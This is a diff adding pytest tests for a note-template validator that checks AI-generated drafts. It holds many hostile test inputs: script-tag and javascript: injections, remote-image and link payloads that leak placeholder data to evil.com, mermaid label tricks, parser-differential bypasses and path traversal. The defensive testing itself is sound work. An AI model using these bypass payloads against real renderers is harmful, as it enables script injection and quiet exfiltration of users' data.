@@ -7,6 +7,7 @@ from ghostbrain.templates import generate
 from ghostbrain.templates.functions import FIELDS, FILTERS, PROMPT_TYPES, VARIABLES
 from ghostbrain.templates.generate import (
     MAX_DRAFT_CHARS,
+    SAMPLE_ENV,
     TEMPLATE_TOOLS,
     DraftInvalid,
     GenerateError,
@@ -16,7 +17,10 @@ from ghostbrain.templates.generate import (
     extract_draft,
     run_turn,
     system_prompt,
+    verify_exact,
 )
+from ghostbrain.templates.parse import parse_template
+from ghostbrain.templates.render import RenderError, render
 from ghostbrain.templates.starters import STARTER_TEMPLATES
 
 GOOD = """---
@@ -165,7 +169,9 @@ def test_run_turn_is_read_only_and_uses_no_user_servers(monkeypatch):
     [req] = provider.requests
     assert req.user_servers == [] and req.session_id is None
     assert req.allowed_tools == TEMPLATE_TOOLS
-    assert "poltergeist_write_doc" not in req.allowed_tools and "poltergeist_ask" not in req.allowed_tools
+    assert req.allowed_tools == "mcp__poltergeist__poltergeist_search"
+    for tool in ("poltergeist_get_note", "poltergeist_write_doc", "poltergeist_ask"):
+        assert tool not in req.allowed_tools
     assert req.system_prompt == system_prompt()
 
 
@@ -238,3 +244,204 @@ def test_links_and_local_images_are_allowed():
         "[ref]: https://example.com/page",
     )
     assert check_draft(draft).ok
+
+
+# ── Fix round 1 + Task 1b ─────────────────────────────────────────────────
+
+BLOCKERS_LINE = GOOD.split("\n").index("## Blockers") + 1
+OPTIONAL_TEAM = GOOD.replace("      type: text\n", "      type: text\n      optional: true\n", 1)
+
+
+def forbidden(draft: str) -> list:
+    found = check_draft(draft)
+    assert not found.ok
+    out = [d for d in found.problems if d.code == "forbidden"]
+    assert out and all(d.severity == "error" and d.line >= 1 for d in out)
+    return out
+
+
+@pytest.mark.parametrize(
+    "body",
+    [
+        # the reviewer's probes: filter literals that render live HTML/script
+        "{{date | format: [<]}}script>alert(1){{date | format: [<]}}/script>",
+        "[x]({{date | format: [java]}}{{date | format: [script:alert(1)]}})",
+    ],
+)
+def test_filter_literals_that_render_html_or_script_are_rejected(body):
+    forbidden(GOOD.replace("## Blockers", body))
+
+
+def test_default_literal_that_renders_a_script_is_rejected():
+    forbidden(OPTIONAL_TEAM.replace(
+        "## Blockers", "{{team | default: <}}script>alert(1){{team | default: <}}/script>"))
+
+
+def test_blank_optional_render_is_checked_even_without_markup_characters():
+    # sample answers render "samplesample"; only the blank render shows the link
+    draft = OPTIONAL_TEAM.replace(
+        "## Blockers", "{{team | default: java}}{{team | default: script:alert(1)}}")
+    assert check_draft(OPTIONAL_TEAM.replace("## Blockers", "{{team | default: java}}")).ok
+    [problem] = forbidden(draft)
+    assert problem.message.startswith("in the note it creates: javascript")
+
+
+@pytest.mark.parametrize("arg", ["[<]", "[>]", "[&amp;]", "[`]", "[\\]"])
+def test_format_and_default_arguments_cannot_hold_markup_characters(arg):
+    for filt in ("format", "default"):
+        draft = OPTIONAL_TEAM.replace("## Blockers", f"{{{{date | {filt}: {arg}}}}}")
+        assert forbidden(draft)[0].line == OPTIONAL_TEAM.split("\n").index("## Blockers") + 1
+
+
+@pytest.mark.parametrize(
+    "prompt_extra",
+    [
+        "      default: \"<b>x</b>\"\n",
+        "      default: \"https://evil.com/?\"\n",
+    ],
+)
+def test_prompt_defaults_cannot_hold_html_or_links(prompt_extra):
+    forbidden(GOOD.replace("      type: text\n", "      type: text\n" + prompt_extra, 1))
+
+
+def test_choice_options_cannot_hold_html_or_links():
+    draft = GOOD.replace(
+        "      type: text\n",
+        "      type: choice\n      options: [ok, \"<script>x</script>\", \"https://evil.com/?\"]\n", 1)
+    assert len(forbidden(draft)) >= 2
+
+
+def test_a_link_assembled_from_filter_literals_is_rejected():
+    forbidden(GOOD.replace("## Blockers", "{{date | format: [https://evil.com/?]}}{{team}}"))
+
+
+@pytest.mark.parametrize(
+    "image",
+    [
+        "![x](https&#58;//evil.com/p.png?{{team}})",
+        "![x](https:&#47;&#47;evil.com/p.png)",
+        "![x](https:evil.com/p.png)",
+        "![x](HTTPS://evil.com/p.png)",
+        "![x](data:image/png;base64,AAAA)",
+        "![a\\]b](https://evil.com/p.png)",
+        "![a [b] c](https://evil.com/p.png)",
+        "![x](\nhttps://evil.com/p.png)",
+        "![alt\nmore](https://evil.com/p.png)",
+        "![x][l]\n\n[l]:\nhttps://evil.com/p.png",
+        "![x][l]\n\n> [l]: https://evil.com/p.png",
+        "![x][l]\n\n- [l]: https://evil.com/p.png",
+        "![x][l]\n\n[l]: https&#58;//evil.com/p.png",
+        "![x]({{date | format: [https://evil.com/p.png?]}}{{team}})",
+    ],
+)
+def test_remote_image_bypasses_are_rejected(image):
+    forbidden(GOOD.replace("## Blockers", image))
+
+
+@pytest.mark.parametrize(
+    "label",
+    [
+        "A[\"<img src='https://evil.com/p.png?{{team}}'>\"]",
+        "A[\"<img src=x.png>\"]",
+        "A[\"x\"] --> B[\"https://evil.com\"]",
+        "A[\"//evil.com/p.png\"]",
+        "click A href \"https://evil.com\"",
+        "A[\"<a href=x>y</a>\"]",
+    ],
+)
+def test_mermaid_cannot_carry_images_links_or_urls(label):
+    forbidden(GOOD.replace("## Blockers", f"```mermaid\ngraph TD;\n{label}\n```"))
+
+
+@pytest.mark.parametrize(
+    "link",
+    [
+        "[x](https://evil.com/?q={{team}})",
+        "[x]({{team}})",
+        "<https://evil.com/{{team}}>",
+        "https://evil.com/?q={{team}}",
+        "www.evil.com/{{team}}",
+        "[x][r]\n\n[r]: https://evil.com/{{team}}",
+        "[x](\n{{team}})",
+    ],
+)
+def test_links_built_from_placeholders_are_rejected(link):
+    forbidden(GOOD.replace("## Blockers", link))
+
+
+def test_system_prompt_rules_cover_html_images_urls_and_search_only():
+    text = system_prompt()
+    assert "no raw html tags" in text.lower()
+    assert "no images from the web" in text
+    assert "no URLs built from placeholders" in text
+    assert "You may search the user's notes" in text and "never copy text from them" in text
+    assert TEMPLATE_TOOLS == "mcp__poltergeist__poltergeist_search"
+
+
+# parser differential: validate exactly the text that is written
+
+
+def test_extract_draft_strips_a_bom_and_normalises_line_endings():
+    assert extract_draft("﻿" + GOOD) == GOOD
+    assert extract_draft(GOOD.replace("\n", "\r")) == GOOD
+
+
+@pytest.mark.parametrize("bad", ["﻿" + GOOD, GOOD.replace("\n", "\r\n"),
+                                 GOOD.replace("## Blockers", "## Block ers"),
+                                 GOOD.replace("## Blockers", "## Block\x00ers")])
+def test_check_draft_rejects_text_other_parsers_split_differently(bad):
+    assert not check_draft(bad).ok
+
+
+def test_duplicate_frontmatter_keys_are_rejected():
+    draft = GOOD.replace("  name: Standup\n", "  name: Standup\n  name: Other\n")
+    found = check_draft(draft)
+    assert not found.ok
+    [dup] = [d for d in found.problems if d.code == "yaml"]
+    assert dup.line == 4 and "name" in dup.message
+
+
+def test_yaml_anchors_are_rejected():
+    draft = GOOD.replace("  name: Standup\n", "  name: &n Standup\n  description: *n\n") \
+        .replace("  description: Daily standup notes\n", "")
+    assert not check_draft(draft).ok
+
+
+def test_a_second_frontmatter_block_is_rejected():
+    draft = GOOD.replace("# {{team}} standup", "---\ntemplate:\n  name: Evil\n---\n# {{team}} standup")
+    assert "forbidden" in codes(draft)
+
+
+@pytest.mark.parametrize(
+    "answer",
+    [
+        GOOD + "```\n",  # a stray closing fence after the file
+        GOOD.replace("status: open\n```\n", "status: open\n"),  # never closed
+    ],
+)
+def test_stray_and_unclosed_fences_are_rejected(answer):
+    assert not check_draft(extract_draft(answer)).ok
+
+
+def test_verify_exact_accepts_the_validated_text_only():
+    template = check_draft(GOOD).template
+    assert template is not None
+    verify_exact(GOOD, template)
+    for changed in (GOOD.replace("name: Standup", "name: Standup 2"),
+                    GOOD.replace("## Blockers", "## Risks"),
+                    GOOD.replace("\n", "\r\n"),
+                    "﻿" + GOOD):
+        with pytest.raises(DraftInvalid):
+            verify_exact(changed, template)
+
+
+def test_folder_and_name_answers_cannot_escape_the_vault():
+    draft = GOOD.replace('"20-contexts/{{context}}/standups"', '"20-contexts/{{context}}/{{team}}"') \
+        .replace('"{{date | format: YYYY-MM-DD}} {{team}} standup"', '"{{team}}"')
+    template = check_draft(draft).template
+    assert template is not None
+    with pytest.raises(RenderError):
+        render(template, {"team": "../../90-meta"}, SAMPLE_ENV)
+    note = render(parse_template(GOOD, "t").template, {"team": "../../x/../y"}, SAMPLE_ENV)
+    assert "/" not in note.filename and ".." not in note.filename
+    assert note.folder == "20-contexts/sample/standups"
